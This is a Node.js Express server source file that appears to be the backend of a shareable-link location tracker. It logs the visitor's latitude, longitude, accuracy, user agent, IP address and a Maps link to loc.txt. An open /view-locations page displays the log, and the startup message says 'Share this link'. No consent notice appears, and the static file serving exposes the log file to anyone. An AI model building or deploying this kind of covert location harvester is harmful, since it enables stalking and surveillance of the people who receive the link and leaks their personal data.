const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Route to save location
app.post('/save-location', (req, res) => {
    try {
        const locationData = req.body;
        const logEntry = `
========================================
Timestamp: ${locationData.timestamp}
Latitude: ${locationData.latitude}
Longitude: ${locationData.longitude}
Accuracy: ${locationData.accuracy} meters
User Agent: ${locationData.userAgent}
IP Address: ${req.ip}
Google Maps Link: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}
========================================

`;

        // Append to loc.txt file
        fs.appendFileSync('loc.txt', logEntry);
        
        console.log('Location saved:', locationData);
        res.json({ success: true, message: 'Location saved successfully' });
    } catch (error) {
        console.error('Error saving location:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Route to view saved locations
app.get('/view-locations', (req, res) => {
    try {
        if (fs.existsSync('loc.txt')) {
            const content = fs.readFileSync('loc.txt', 'utf8');
            res.type('text/plain').send(content);
        } else {
            res.send('No locations recorded yet.');
        }
    } catch (error) {
        res.status(500).send('Error reading locations: ' + error.message);
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log(`Share this link: http://localhost:${PORT}`);
    console.log(`View saved locations at: http://localhost:${PORT}/view-locations`);
});
